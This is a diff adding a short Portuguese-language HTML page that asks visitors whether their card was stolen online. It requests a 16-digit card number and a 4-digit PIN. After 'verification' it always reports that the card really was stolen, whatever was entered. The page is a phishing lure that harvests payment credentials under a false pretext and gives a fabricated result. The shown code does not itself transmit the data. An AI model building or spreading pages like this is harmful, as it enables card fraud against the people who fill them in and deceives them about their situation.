@@ -1,0 +1,60 @@
+<h2>Você teve seu cartão roubado na internet?</h2>
+
+<form id="form">
+
+  <label for="card-number">Número do cartão:</label>
+
+  <input type="text" id="card-number" name="card-number" oninput="checkButton()">
+
+  <br>
+
+  <label for="password">Senha:</label>
+
+  <input type="password" id="password" name="password" oninput="checkButton()">
+
+  <br>
+
+  <input type="button" id="verify-button" value="Verificar" disabled>
+
+  <input type="submit" value="Enviar" id="submit-button" style="display:none">
+
+  <br>
+
+</form>
+
+<div id="message" style="display:none">Seu cartão realmente foi roubado</div>
+
+<script>
+
+  function checkButton() {
+
+    var cardNumber = document.getElementById("card-number").value;
+
+    var password = document.getElementById("password").value;
+
+    var verifyButton = document.getElementById("verify-button");
+
+    var submitButton = document.getElementById("submit-button");
+
+    if (cardNumber.length == 16 && password.length == 4) {
+
+        verifyButton.disabled = false;
+
+        verifyButton.addEventListener("click", function(){
+
+            document.getElementById("form").style.display = "none";
+
+            document.getElementById("message").style.display = "block";
+
+        });
+
+    } else {
+
+        verifyButton.disabled = true;
+
+    }
+
+  }
+
+</script>
+
